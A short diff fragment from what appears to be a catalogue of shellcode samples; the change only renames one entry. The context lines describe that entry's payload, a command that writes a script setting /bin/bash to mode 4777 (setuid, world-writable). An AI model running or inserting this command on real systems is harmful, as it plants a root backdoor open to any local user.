@@ -48,7 +48,7 @@
     - all bytes are unique
     - 14 bytes long
 
-10. shellcode.59(3).s
+10. shellcode.59(4).s
 
     - echo -ne "#!/bin/bash\nchmod 4777 /bin/bash" > f
     - 12 bytes long
